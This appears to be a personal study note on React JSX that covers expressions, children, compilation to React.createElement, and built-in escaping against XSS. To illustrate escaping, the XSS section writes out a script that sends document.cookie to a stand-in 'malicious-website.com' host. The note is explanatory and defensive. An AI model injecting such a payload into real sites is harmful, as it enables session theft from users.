# JSX (Javascript XML) :-

-   JSX is neither a string nor HTML. It is a template language, but with the full power of JavaScript.

```js
const element = <h1>Hello, world!</h1>;
```

## why JSX :-

-   Instead of artificially separating technologies by putting markup and logic in separate files, `React separates concerns with loosely coupled units called “components” that contain both`.
    -   `Separation of concern`:
        -   Separation of concerns is a software engineering principle that aims to divide a system into distinct and independent parts, each responsible for a specific concern or functionality.
    -   `In React, components are self-contained units that encapsulate both the markup (or JSX) and the logic associated with that specific part of the user interface`:
        -   This means that the code for a component, including its visual representation and behavior, is contained within a single file.
        -   By combining markup and logic within components, React promotes the idea of having a single source of truth for each UI component.
        -   This allows developers to manage and reason about the component's state, behavior, and appearance in a more cohesive(Self-contained and have minimal dependencies on other modules/components) and efficient manner.

## Embedding Expressions in JSX :-

-   eg 1 :-

```js
const name = 'Nikhil Gautam';
const element = <h1>Hello, {name}</h1>;
```

-   We can put any valid JavaScript expression inside the curly braces in JSX. For example, (2 + 2), user.firstName, or formatName(user) are all valid JavaScript expressions.

-   eg 2 :-

```js
function formatName(user) {
    return user.firstName + ' ' + user.lastName;
}

const user = {
    firstName: 'Nikhil',
    lastName: 'Gautam',
};

const element = <h1>Hello, {formatName(user)}!</h1>;
```

-   eg 3 :-

```js
const element = <a href="https://www.reactjs.org"> link </a>;
```

-   eg 4 :-

```js
const element = <img src={user.avatarUrl}></img>;
```

**_NOTE: React DOM uses camelCase property naming convention instead of HTML attribute names.`class` becomes `className` in JSX, and `tabindex` becomes `tabIndex`._**

## Specifying Children with JSX :-

-   eg 1 :-

```js
const element = (
    <div>
        <h1>Hello!</h1>
        <h2>Good to see you here.</h2>
    </div>
);
```

## JSX Prevents Injection Attacks :-

-   By default, React DOM escapes values embedded in JSX to prevent `XSS (cross-site scripting) attacks`.

-   React automatically converts them to a string and escapes any characters that have special meaning in HTML. This means that any potentially dangerous characters, such as <, >, &, ', and ", are replaced with their corresponding HTML entities.

-   eg 1 :-

```js
const user = '<script>alert("XSS");</script>';
const element = <p>{user}</p>;

// React DOM will escape the value of the user variable before rendering it, resulting in the following rendered HTML:

<p>&lt;script&gt;alert("XSS");&lt;/script&gt;</p>;
```

-   By escaping the value, the potentially malicious script tags and code are treated as plain text and not executed as actual JavaScript. This protects against XSS attacks where an attacker attempts to inject and execute malicious code within the rendered HTML.

-   It's important to note that while React provides this built-in protection against XSS attacks, it's still crucial to follow other security best practices, such as proper input validation and sanitization on the server-side, to ensure a robust security posture for your application.

-   Here's an example of a malicious code that could be injected in a user input field and potentially executed if not properly escaped or sanitized:

```js
<script>
  fetch('https://malicious-website.com/steal-data', {
    method: 'POST',
    body: JSON.stringify({ data: document.cookie }),
    headers: {
      'Content-Type': 'application/json'
    }
  });
</script>
```

    - In this example, an attacker tries to inject a <script> tag that performs an HTTP POST request to a malicious website, sending the user's cookies as the payload. If this script is injected and executed on a vulnerable website, it can lead to unauthorized access and data theft.

    - However, when using React with proper escaping, the injected code will be treated as plain text and rendered as such, preventing the script from executing.

## JSX Represents Objects :-

-   Babel compiles JSX down to `React.createElement()` calls.
-   These two examples are identical:

```js
const element = <h1 className="greeting">Hello, world!</h1>;
```

```js
const element = React.createElement(
    'h1',
    { className: 'greeting' },
    'Hello, world!'
);
```

-   `React.createElement()` performs a few checks to help you write bug-free code but essentially it creates an object like this:

```js
// Note: this structure is simplified
const element = {
    type: 'h1',
    props: {
        className: 'greeting',
        children: 'Hello, world!',
    },
};
```

-   These objects are called “React elements”. You can think of them as descriptions of what you want to see on the screen. React reads these objects and uses them to construct the DOM and keep it up to date.
